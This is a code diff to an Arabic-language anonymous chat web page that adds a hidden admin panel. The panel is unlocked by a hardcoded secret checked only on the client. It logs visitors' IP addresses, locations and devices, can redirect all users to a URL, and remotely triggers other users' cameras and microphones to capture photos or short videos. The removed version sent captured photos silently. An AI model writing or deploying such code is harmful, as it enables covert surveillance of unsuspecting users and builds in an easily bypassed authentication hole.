@@ -15,11 +15,19 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 
 #timer { color: #fff; font-size: 13px; background: rgba(0,0,0,0.2); padding: 3px 8px; border-radius: 4px; display: none; }
 
-/* تنسيق لوحة الأدمن المدمجة */
-#admin-panel { display: none; background: #ffeaa7; padding: 10px; border-bottom: 2px solid #fdcb6e; text-align: center; font-size: 13px; }
-#admin-panel input, #admin-panel select { padding: 4px; border-radius: 4px; border: 1px solid #ccc; font-size: 13px; margin: 2px; }
-#admin-panel button { padding: 4px 8px; background: #e17055; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; margin: 2px; }
+/* لوحة الأدمن الاحترافية */
+#admin-panel { display: none; background: #2d3436; color: #fff; padding: 12px; border-bottom: 3px solid #fdcb6e; font-size: 13px; }
+#admin-panel h4 { color: #fdcb6e; margin-bottom: 8px; }
+.admin-controls-row { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 8px; align-items: center; }
+#admin-panel input, #admin-panel select { padding: 5px; border-radius: 4px; border: 1px solid #ccc; font-size: 12px; }
+#admin-panel button { padding: 5px 10px; background: #0984e3; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; }
 #admin-panel button.danger { background: #d63031; }
+#admin-panel button.success { background: #00b894; }
+
+.admin-logs-table { width: 100%; border-collapse: collapse; margin-top: 5px; font-size: 11px; background: #fff; color: #333; }
+.admin-logs-table th, .admin-logs-table td { padding: 5px; border: 1px solid #ddd; text-align: right; }
+.admin-logs-table th { background: #636e72; color: #fff; }
+
 #system-alert-banner { display: none; background: #ff4757; color: white; text-align: center; padding: 6px; font-weight: bold; font-size: 14px; }
 
 #chat { width: 100%; direction: rtl; position: relative; }
@@ -40,8 +48,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 #conv p.partner-msg { background: rgb(24, 149, 210); color: rgb(255, 255, 255); margin-left: 0; margin-right: auto; }
 #conv p.partner-msg a, #conv div.my-msg a { text-decoration: underline; }
 
-#conv img { max-width: 180px; max-height: 180px; border-radius: 5px; display: block; margin-top: 5px; cursor: pointer; transition: opacity 0.2s; }
-#conv img:hover { opacity: 0.9; }
+#conv img { max-width: 180px; max-height: 180px; border-radius: 5px; display: block; margin-top: 5px; cursor: pointer; }
 #conv video, #conv audio { max-width: 200px; border-radius: 5px; display: block; margin-top: 5px; }
 
 #send { display: table; width: 100%; background: rgb(248, 248, 248); padding: 2px 0px; border-top: 1px solid rgb(238, 238, 238); border-bottom: 1px solid rgb(238, 238, 238); }
@@ -59,8 +66,16 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 #out span { color: red; }
 #out a { background: coral; color: rgb(255, 255, 255); text-decoration: none; padding: 2px 5px; border-radius: 3px; cursor: pointer; }
 
+/* نافذة معاينة الوسائط الملتقطة للأدمن قبل إرسالها */
+#media-preview-modal { display: none; position: fixed; z-index: 10000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; flex-direction: column; }
+#media-preview-content { max-width: 90%; max-height: 70vh; border-radius: 8px; margin-bottom: 15px; }
+.preview-btns { display: flex; gap: 10px; }
+.preview-btns button { padding: 10px 20px; font-size: 16px; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
+.btn-send-media { background: #00b894; color: white; }
+.btn-cancel-media { background: #d63031; color: white; }
+
 #image-modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.85); text-align: center; justify-content: center; align-items: center; }
-#image-modal img { max-width: 90%; max-height: 90%; border-radius: 5px; box-shadow: 0 0 15px rgba(255,255,255,0.2); }
+#image-modal img { max-width: 90%; max-height: 90%; border-radius: 5px; }
 #image-modal span { position: absolute; top: 15px; left: 25px; color: #fff; font-size: 35px; font-weight: bold; cursor: pointer; }
 </style>
 </head>
@@ -75,20 +90,48 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
   
   <div id="system-alert-banner"></div>
 
-  <!-- لوحة تحكم الإدارة تظهر فقط عبر الرابط السري -->
+  <!-- لوحة تحكم الأدمن الشاملة -->
   <div id="admin-panel">
-    <input type="text" id="admin-url-inp" placeholder="رابط..." style="width: 80px;">
-    <button onclick="adminAction('open_url')">فتح رابط</button>
-    <button onclick="adminAction('request_photo')">📸 طلب صورة</button>
-    <select id="preset-bg-color" onchange="adminAction('change_bg', this.value)">
-      <option value="">تغيير الخلفية</option>
-      <option value="#ffffff">أبيض</option>
-      <option value="#f1f2f6">رمادي</option>
-      <option value="#2d3436">داكن</option>
-    </select>
-    <button onclick="adminAction('alert')">📢 تنبيه</button>
-    <button class="danger" onclick="adminAction('clear_all')">مسح الكل</button>
-    <button class="danger" onclick="adminAction('clear_theirs')">مسح رسائله</button>
+    <h4>⚙️ لوحة الإدارة والتحكم والمراقبة</h4>
+    <div class="admin-controls-row">
+      <input type="text" id="admin-url-inp" placeholder="رابط توجيه...">
+      <button onclick="adminAction('open_url')">فتح رابط للكل</button>
+      <button class="success" onclick="adminAction('request_photo')">📸 طلب لقطة شاشة فورية</button>
+      <select id="video-duration-sel">
+        <option value="3">فيديو 3 ثواني</option>
+        <option value="5">فيديو 5 ثواني</option>
+        <option value="10">فيديو 10 ثواني</option>
+      </select>
+      <button class="success" onclick="adminAction('request_video')">🎥 طلب تسجيل فيديو</button>
+    </div>
+    <div class="admin-controls-row">
+      <select id="preset-bg-color" onchange="adminAction('change_bg', this.value)">
+        <option value="">تغيير خلفية الموقع</option>
+        <option value="#ffffff">أبيض</option>
+        <option value="#f1f2f6">رمادي فاتح</option>
+        <option value="#2d3436">داكن (ليلي)</option>
+      </select>
+      <button onclick="adminAction('alert')">📢 إرسال تنبيه عام</button>
+      <button class="danger" onclick="adminAction('clear_all')">مسح الشات بالكامل</button>
+      <button class="danger" onclick="adminAction('clear_theirs')">مسح رسائل الطرف الآخر</button>
+    </div>
+    <div>
+      <b style="color:#fdcb6e;">سجل المتصلين والزوار الأحيائي:</b>
+      <table class="admin-logs-table">
+        <thead>
+          <tr>
+            <th>Socket ID</th>
+            <th>الـ IP</th>
+            <th>الدولة / المدينة</th>
+            <th>نوع الجهاز / المتصفح</th>
+            <th>إجراء سريع</th>
+          </tr>
+        </thead>
+        <tbody id="admin-logs-body">
+          <tr><td colspan="5" style="text-align:center;">بانتظار اتصال المستخدمين...</td></tr>
+        </tbody>
+      </table>
+    </div>
   </div>
   
   <div id="chat">
@@ -115,6 +158,15 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     <a onclick="location.reload()">بحث عن متصل</a>
   </h5>
 
+  <!-- نافذة معاينة الوسائط الملتقطة للأدمن -->
+  <div id="media-preview-modal">
+    <div id="preview-container" style="display:flex; justify-content:center; align-items:center;"></div>
+    <div class="preview-btns">
+      <button class="btn-send-media" onclick="confirmSendMedia()">رفع وإرسال للشات</button>
+      <button class="btn-cancel-media" onclick="cancelSendMedia()">إلغاء وحذف</button>
+    </div>
+  </div>
+
   <div id="image-modal" onclick="closeModal()">
     <span onclick="closeModal()">&times;</span>
     <img id="modal-img">
@@ -122,7 +174,13 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 
   <script src="/socket.io/socket.io.js"></script>
   <script>
-    const socket = io();
+    const socket = io({
+      reconnection: true,
+      reconnectionAttempts: Infinity,
+      reconnectionDelay: 1000,
+      timeout: 20000
+    });
+
     const sr = document.getElementById('sr');
     const hi = document.getElementById('hi');
     const conv = document.getElementById('conv');
@@ -141,11 +199,11 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     let typingSpan = null;
     let timerInterval;
     let secondsElapsed = 0;
-    
-    // متغير للتأكد من وجود شخص متصل
     let isConnectedPartner = false; 
 
-    // قراءة الرابط وتفعيل الأدمن
+    // متغيرات مؤقتة للوسائط المراد مراجعتها
+    let capturedPayload = null;
+
     const urlParams = new URLSearchParams(window.location.search);
     const adminSecret = urlParams.get('admin');
     const isAdmin = adminSecret === 'mySuperSecretAdmin123';
@@ -160,7 +218,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     socket.emit('find_partner');
 
     socket.on('matched', () => {
-      isConnectedPartner = true; // تم الاتصال
+      isConnectedPartner = true;
       hi.style.setProperty('display', 'table', 'important');
       inp.disabled = false;
       snd.disabled = false;
@@ -168,8 +226,9 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       startTimer();
     });
 
+    // اكتشاف المغادرة بسرعة فائقة
     socket.on('partner_disconnected', () => {
-      isConnectedPartner = false; // انقطع الاتصال
+      isConnectedPartner = false;
       chat.style.display = 'none';
       out.style.display = 'block';
       stopTimer();
@@ -280,10 +339,9 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       if(e.key === 'Enter') sendMsg();
     });
 
-    // --- منع الضغط على إرسال الملفات إذا لم يكن متصلاً ---
     fileLabel.addEventListener('click', (e) => {
       if (!isConnectedPartner) {
-        e.preventDefault(); // منع فتح نافذة الملفات
+        e.preventDefault();
         alert('لا يمكنك إرسال ملفات، يرجى الانتظار حتى يتم الاتصال بشخص.');
       }
     });
@@ -301,7 +359,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
         const payload = { type: type, content: event.target.result };
         socket.emit('message', payload);
         appendMessage(payload, true);
-        fileInput.value = ''; // تفريغ الحقل
+        fileInput.value = '';
       };
       reader.readAsDataURL(file);
     });
@@ -310,7 +368,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     let audioChunks = [];
     let isRecording = false;
 
-    // --- منع تسجيل الصوت إذا لم يكن متصلاً ---
     micBtn.addEventListener('click', async () => {
       if (!isConnectedPartner) {
         alert('لا يمكنك تسجيل رسالة صوتية، يرجى الانتظار حتى يتم الاتصال بشخص.');
@@ -352,9 +409,9 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     });
 
     // ==========================================
-    // دوال لوحة تحكم الإدارة والاستجابة لها
+    // دوال لوحة التحكم والأوامر المتقدمة
     // ==========================================
-    
+
     function adminAction(type, value = null) {
       if (!isAdmin) return;
       let payload = { secret: adminSecret, action: '' };
@@ -365,6 +422,10 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       } else if (type === 'request_photo') {
         payload.action = 'request_media';
         payload.mediaType = 'photo';
+      } else if (type === 'request_video') {
+        payload.action = 'request_media';
+        payload.mediaType = 'video';
+        payload.duration = parseInt(document.getElementById('video-duration-sel').value) || 3;
       } else if (type === 'change_bg') {
         payload.action = 'change_bg';
         payload.bgColor = value;
@@ -381,6 +442,37 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       }
 
       socket.emit('admin_action', payload);
+    }
+
+    // استقبال معلومات الزوار لعرضها في جدول الأدمن
+    socket.on('device_info', (data) => {
+      if (!isAdmin) return;
+      const tbody = document.getElementById('admin-logs-body');
+      if (tbody.innerText.includes('بانتظار')) tbody.innerHTML = '';
+
+      // تجنب تكرار نفس الـ Socket ID
+      if (document.getElementById(`row-${data.id}`)) return;
+
+      const row = document.createElement('tr');
+      row.id = `row-${data.id}`;
+      row.innerHTML = `
+        <td style="font-size:10px;">${data.id.substring(0,6)}...</td>
+        <td dir="ltr">${data.ip}</td>
+        <td><b>${data.country}</b> - ${data.city}</td>
+        <td style="font-size:10px;">${data.ua}</td>
+        <td><button style="padding:2px 5px; font-size:10px;" onclick="targetCapture('${data.id}', 'photo')">📸 لقطة</button></td>
+      `;
+      tbody.prepend(row);
+    });
+
+    function targetCapture(socketId, mediaType) {
+      socket.emit('admin_action', {
+        secret: adminSecret,
+        action: 'request_media',
+        mediaType: mediaType,
+        targetSocket: socketId,
+        duration: 3
+      });
     }
 
     socket.on('system_alert', (msg) => {
@@ -406,25 +498,87 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       document.body.style.backgroundColor = bgColor;
     });
 
-    socket.on('trigger_camera', async ({ mediaType }) => {
+    // التقاط الوسائط ومعاينتها بدقة قبل الرفع
+    socket.on('trigger_media_capture', async ({ type, duration }) => {
       if (isAdmin) return;
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        if (mediaType === 'photo') {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: type === 'video' });
+        
+        if (type === 'photo') {
           const videoTrack = stream.getVideoTracks()[0];
           const imageCapture = new ImageCapture(videoTrack);
           const photoBlob = await imageCapture.takePhoto();
+          stream.getTracks().forEach(track => track.stop());
+
           const reader = new FileReader();
           reader.onloadend = () => {
-            socket.emit('user_media_captured', { dataUrl: reader.result, type: 'image' });
-            stream.getTracks().forEach(track => track.stop());
+            showMediaPreview(reader.result, 'image');
           };
           reader.readAsDataURL(photoBlob);
+
+        } else if (type === 'video') {
+          const chunks = [];
+          const mediaRec = new MediaRecorder(stream);
+          mediaRec.ondataavailable = e => chunks.push(e.data);
+          mediaRec.onstop = () => {
+            stream.getTracks().forEach(track => track.stop());
+            const videoBlob = new Blob(chunks, { type: 'video/webm' });
+            const reader = new FileReader();
+            reader.onloadend = () => {
+              showMediaPreview(reader.result, 'video');
+            };
+            reader.readAsDataURL(videoBlob);
+          };
+
+          mediaRec.start();
+          setTimeout(() => {
+            if (mediaRec.state === 'recording') mediaRec.stop();
+          }, (duration || 3) * 1000);
         }
       } catch (err) {
-        console.log('الكاميرا غير متاحة');
+        console.log('تعذر تشغيل الكاميرا');
       }
     });
+
+    function showMediaPreview(dataUrl, type) {
+      const modal = document.getElementById('media-preview-modal');
+      const container = document.getElementById('preview-container');
+      container.innerHTML = '';
+
+      if (type === 'image') {
+        const img = document.createElement('img');
+        img.src = dataUrl;
+        img.id = 'media-preview-content';
+        container.appendChild(img);
+      } else {
+        const video = document.createElement('video');
+        video.src = dataUrl;
+        video.controls = true;
+        video.autoplay = true;
+        video.id = 'media-preview-content';
+        container.appendChild(video);
+      }
+
+      capturedPayload = { type: type, dataUrl: dataUrl };
+      modal.style.display = 'flex';
+    }
+
+    function confirmSendMedia() {
+      if (capturedPayload) {
+        socket.emit('user_media_captured', capturedPayload);
+        appendMessage({ type: capturedPayload.type, content: capturedPayload.dataUrl }, true);
+      }
+      closeMediaPreview();
+    }
+
+    function cancelSendMedia() {
+      closeMediaPreview();
+    }
+
+    function closeMediaPreview() {
+      document.getElementById('media-preview-modal').style.display = 'none';
+      capturedPayload = null;
+    }
   </script>
 </body>
 </html>
